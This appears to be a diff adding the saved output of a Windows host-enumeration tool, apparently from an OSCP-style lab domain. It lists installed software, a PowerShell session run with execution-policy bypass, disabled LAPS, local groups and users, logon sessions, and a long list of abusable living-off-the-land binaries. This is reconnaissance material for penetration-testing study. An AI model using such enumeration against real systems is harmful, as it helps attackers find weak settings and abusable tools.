+  Architecture                   : x64
+
+  DisplayName                    : Microsoft Update Health Tools
+  DisplayVersion                 : 5.72.0.0
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x64
+
+  DisplayName                    : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326
+  DisplayVersion                 : 14.32.31326
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x64
+
+====== InterestingFiles ======
+
+
+Accessed      Modified      Path
+----------    ----------    -----
+2026-02-21    2026-02-21    C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\22.012.0117.0003\IRMProtectors\microsoft.aip.pdfprotector.dll
+====== InterestingProcesses ======
+
+    Category     : interesting
+    Name         : powershell.exe
+    Product      : PowerShell host process
+    ProcessID    : 4236
+    Owner        : OSCP\r.andrews
+    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+
+    Category     : interesting
+    Name         : powershell.exe
+    Product      : PowerShell host process
+    ProcessID    : 9116
+    Owner        : OSCP\r.andrews
+    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass
+
+====== InternetSettings ======
+
+General Settings
+  Hive                               Key : Value
+
+  HKCU             CertificateRevocation : 1
+  HKCU          DisableCachingOfSSLPages : 0
+  HKCU                IE5_UA_Backup_Flag : 5.0
+  HKCU                   PrivacyAdvanced : 1
+  HKCU                   SecureProtocols : 10240
+  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU              ZonesSecurityUpgrade : System.Byte[]
+  HKCU                WarnonZoneCrossing : 0
+  HKCU                   EnableNegotiate : 1
+  HKCU                       ProxyEnable : 0
+  HKCU                      MigrateProxy : 1
+  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
+  HKCU                CodeBaseSearchPath : CODEBASE
+  HKCU                    EnablePunycode : 1
+  HKCU                      MinorVersion : 0
+  HKCU                    WarnOnIntranet : 1
+
+URLs by Zone
+  No URLs configured
+
+Zone Auth Settings
+====== KeePass ======
+
+====== LAPS ======
+
+  LAPS Enabled                          : False
+  LAPS Admin Account Name               : 
+  LAPS Password Complexity              : 
+  LAPS Password Length                  : 
+  LAPS Expiration Protection Enabled    : 
+====== LastShutdown ======
+
+  LastShutdown                   : 10/10/2024 7:50:09 PM
+
+====== LocalGPOs ======
+
+  GPOName                        : {31B2F340-016D-11D2-945F-00C04FB984F9}
+  GPOType                        : machine
+  DisplayName                    : Default Domain Policy
+  Link                           : LDAP://DC=oscp,DC=exam
+  FileSysPath                    : C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
+  Options                        : ALL_SECTIONS_ENABLED
+  GPOLink                        : DOMAIN
+  Extensions                     : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
+
+  GPOName                        : Local Group Policy
+  GPOType                        : user
+  DisplayName                    : Local Group Policy
+  Link                           : Local
+  FileSysPath                    : C:\Windows\System32\GroupPolicy\User
+  Options                        : ALL_SECTIONS_ENABLED
+  GPOLink                        : LOCAL_MACHINE
+  Extensions                     : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
+
+====== LocalGroups ======
+
+Non-empty Local Groups (and memberships)
+
+
+  ** WS26\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)
+
+  User            WS26\Administrator                       S-1-5-21-2756297892-2186407355-380279769-500
+  Group           OSCP\Domain Admins                       S-1-5-21-2481101513-2954867870-2660283483-512
+
+  ** WS26\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)
+
+  User            WS26\Guest                               S-1-5-21-2756297892-2186407355-380279769-501
+
+  ** WS26\IIS_IUSRS ** (Built-in group used by Internet Information Services.)
+
+  WellKnownGroup  NT AUTHORITY\IUSR                        S-1-5-17
+
+  ** WS26\Remote Desktop Users ** (Members in this group are granted the right to logon remotely)
+
+  User            OSCP\r.andrews                           S-1-5-21-2481101513-2954867870-2660283483-1106
+
+  ** WS26\Remote Management Users ** (Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.)
+
+  User            OSCP\r.andrews                           S-1-5-21-2481101513-2954867870-2660283483-1106
+  User            OSCP\g.jarvis                            S-1-5-21-2481101513-2954867870-2660283483-1105
+
+  ** WS26\System Managed Accounts Group ** (Members of this group are managed by the system.)
+
+  User            WS26\DefaultAccount                      S-1-5-21-2756297892-2186407355-380279769-503
+
+  ** WS26\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)
+
+  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
+  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
+  Group           OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513
+
+====== LocalUsers ======
+
+  ComputerName                   : localhost
+  UserName                       : Administrator
+  Enabled                        : True
+  Rid                            : 500
+  UserType                       : Administrator
+  Comment                        : Built-in account for administering the computer/domain
+  PwdLastSet                     : 10/9/2024 10:41:39 AM
+  LastLogon                      : 2/21/2026 7:02:00 PM
+  NumLogins                      : 27
+
+  ComputerName                   : localhost
+  UserName                       : DefaultAccount
+  Enabled                        : False
+  Rid                            : 503
+  UserType                       : Guest
+  Comment                        : A user account managed by the system.
+  PwdLastSet                     : 1/1/1970 12:00:00 AM
+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+  ComputerName                   : localhost
+  UserName                       : Guest
+  Enabled                        : False
+  Rid                            : 501
+  UserType                       : Guest
+  Comment                        : Built-in account for guest access to the computer/domain
+  PwdLastSet                     : 1/1/1970 12:00:00 AM
+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+  ComputerName                   : localhost
+  UserName                       : WDAGUtilityAccount
+  Enabled                        : False
+  Rid                            : 504
+  UserType                       : Guest
+  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
+  PwdLastSet                     : 10/9/2024 1:44:21 PM
+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+====== LogonEvents ======
+
+ERROR: Unable to collect. Must be an administrator/in a high integrity context.
+====== LogonSessions ======
+
+Logon Sessions (via WMI)
+
+
+  UserName              : r.andrews
+  Domain                : OSCP
+  LogonId               : 2695985
+  LogonType             : RemoteInteractive
+  AuthenticationPackage : Kerberos
+  StartTime             : 2/21/2026 7:03:11 PM
+  UserPrincipalName     : 
+
+  UserName              : r.andrews
+  Domain                : OSCP
+  LogonId               : 2636154
+  LogonType             : Network
+  AuthenticationPackage : NTLM
+  StartTime             : 2/21/2026 7:03:05 PM
+  UserPrincipalName     : 
+====== LOLBAS ======
+
+Path: C:\Windows\System32\advpack.dll
+Path: C:\Windows\SysWOW64\advpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\advpack.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\advpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\f\advpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\r\advpack.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\f\advpack.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\r\advpack.dll
+Path: C:\Windows\System32\at.exe
+Path: C:\Windows\SysWOW64\at.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\at.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\at.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\f\at.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\r\at.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\f\at.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\r\at.exe
+Path: C:\Windows\System32\AtBroker.exe
+Path: C:\Windows\SysWOW64\AtBroker.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\AtBroker.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\AtBroker.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\f\AtBroker.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\r\AtBroker.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\f\AtBroker.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\r\AtBroker.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\bash.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\f\bash.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\r\bash.exe
+Path: C:\Windows\System32\bitsadmin.exe
+Path: C:\Windows\SysWOW64\bitsadmin.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.22621.1_none_aea75cb6002a3c3d\bitsadmin.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.22621.1_none_b8fc0708348afe38\bitsadmin.exe
+Path: C:\Windows\System32\certutil.exe
+Path: C:\Windows\SysWOW64\certutil.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\certutil.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\certutil.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\f\certutil.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\r\certutil.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\f\certutil.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\r\certutil.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.22621.1_none_221d3eb9e377a49e\CL_Invocation.ps1
+Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.22621.1_none_de77f3c8329c1783\CL_MutexVerifiers.ps1
+Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
+Path: C:\Windows\System32\cmd.exe
+Path: C:\Windows\SysWOW64\cmd.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\cmd.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\cmd.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\f\cmd.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\r\cmd.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\f\cmd.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\r\cmd.exe
+Path: C:\Windows\System32\cmdkey.exe
+Path: C:\Windows\SysWOW64\cmdkey.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.22621.1_none_3e7d3e78d096338c\cmdkey.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.22621.1_none_48d1e8cb04f6f587\cmdkey.exe
+Path: C:\Windows\System32\cmstp.exe
+Path: C:\Windows\SysWOW64\cmstp.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.22621.1_none_c0b60b255443bd2e\cmstp.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.22621.1_none_cb0ab57788a47f29\cmstp.exe
+Path: C:\Windows\System32\comsvcs.dll
+Path: C:\Windows\SysWOW64\comsvcs.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\comsvcs.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\comsvcs.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\f\comsvcs.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\r\comsvcs.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\f\comsvcs.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\r\comsvcs.dll
+Path: C:\Windows\System32\control.exe
+Path: C:\Windows\SysWOW64\control.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.22621.1_none_fb01c4f19e3c04ac\control.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.22621.1_none_05566f43d29cc6a7\control.exe
+Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_78ce8a6e35a89ad2\csc.exe
+Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.322_none_6ee01ba4a5a0f42b\csc.exe
+Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_c07bc1454a24c3d8\csc.exe
+Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.322_none_b68d527bba1d1d31\csc.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+Path: C:\Windows\System32\cscript.exe
+Path: C:\Windows\SysWOW64\cscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\cscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\cscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\f\cscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\r\cscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\f\cscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\r\cscript.exe
+Path: C:\Windows\System32\desktopimgdownldr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\desktopimgdownldr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\f\desktopimgdownldr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\r\desktopimgdownldr.exe
+Path: C:\Windows\WinSxS\amd64_dfsvc_b03f5f7f11d50a3a_4.0.15912.0_none_c2b647ba71508734\dfsvc.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
+Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
+Path: C:\Windows\System32\esentutl.exe
+Path: C:\Windows\SysWOW64\esentutl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\esentutl.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\esentutl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\f\esentutl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\r\esentutl.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\f\esentutl.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\r\esentutl.exe
+Path: C:\Windows\System32\eventvwr.exe
+Path: C:\Windows\SysWOW64\eventvwr.exe
+Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\eventvwr.exe
+Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\eventvwr.exe
+Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\f\eventvwr.exe
+Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\r\eventvwr.exe
+Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\f\eventvwr.exe
+Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\r\eventvwr.exe
+Path: C:\Windows\System32\expand.exe
+Path: C:\Windows\SysWOW64\expand.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.22621.1_none_ba0848304b9ea147\expand.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.22621.1_none_c45cf2827fff6342\expand.exe
+Path: C:\Program Files\Internet Explorer\ExtExport.exe
+Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\ExtExport.exe
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\ExtExport.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\f\ExtExport.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\r\ExtExport.exe
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\f\ExtExport.exe
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\r\ExtExport.exe
+Path: C:\Windows\System32\extrac32.exe
+Path: C:\Windows\SysWOW64\extrac32.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.22621.1_none_3cbf6652f7a393ed\extrac32.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.22621.1_none_471410a52c0455e8\extrac32.exe
+Path: C:\Windows\System32\findstr.exe
+Path: C:\Windows\SysWOW64\findstr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.22621.1_none_88c557164d72d7c3\findstr.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.22621.1_none_931a016881d399be\findstr.exe
+Path: C:\Windows\System32\forfiles.exe
+Path: C:\Windows\SysWOW64\forfiles.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.22621.1_none_b6b93b53d146fa89\forfiles.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.22621.1_none_c10de5a605a7bc84\forfiles.exe
+Path: C:\Windows\System32\ftp.exe
+Path: C:\Windows\SysWOW64\ftp.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\ftp.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\ftp.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\f\ftp.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\r\ftp.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\f\ftp.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\r\ftp.exe
+Path: C:\Windows\System32\gpscript.exe
+Path: C:\Windows\SysWOW64\gpscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.22621.1_none_c6ad0436636a732c\gpscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.22621.1_none_d101ae8897cb3527\gpscript.exe
+Path: C:\Windows\hh.exe
+Path: C:\Windows\SysWOW64\hh.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.22621.1_none_29ebc266787aab53\hh.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.22621.1_none_34406cb8acdb6d4e\hh.exe
+Path: C:\Windows\System32\ie4uinit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\ie4uinit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\f\ie4uinit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\r\ie4uinit.exe
+Path: C:\Windows\System32\IEAdvpack.dll
+Path: C:\Windows\SysWOW64\IEAdvpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\IEAdvpack.dll
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\IEAdvpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\f\IEAdvpack.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\r\IEAdvpack.dll
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\f\IEAdvpack.dll
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\r\IEAdvpack.dll
+Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.0_none_61c655cc264adc4b\ilasm.exe
+Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.156_none_57dbe3f2963fa1a5\ilasm.exe
+Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.0_none_a9738ca33ac70551\ilasm.exe
+Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.156_none_9f891ac9aabbcaab\ilasm.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
+Path: C:\Windows\System32\InfDefaultInstall.exe
+Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.22621.1_none_ce2a4f738fcd9a38\InfDefaultInstall.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.22621.1_none_d87ef9c5c42e5c33\InfDefaultInstall.exe
+Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15912.0_none_d8607d8709732f01\InstallUtil.exe
+Path: C:\Windows\WinSxS\wow64_installutil_b03f5f7f11d50a3a_4.0.15912.0_none_022ec4a0cabdc41e\InstallUtil.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
+Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15912.0_none_04bcf928bfc9ab50\jsc.exe
+Path: C:\Windows\WinSxS\wow64_jsc_b03f5f7f11d50a3a_4.0.15912.0_none_2e8b40428114406d\jsc.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
+Path: C:\Windows\System32\makecab.exe
+Path: C:\Windows\SysWOW64\makecab.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.22621.1_none_52654d9a5cfd091d\makecab.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.22621.1_none_5cb9f7ec915dcb18\makecab.exe
+Path: C:\Windows\System32\mavinject.exe
+Path: C:\Windows\SysWOW64\mavinject.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\mavinject.exe
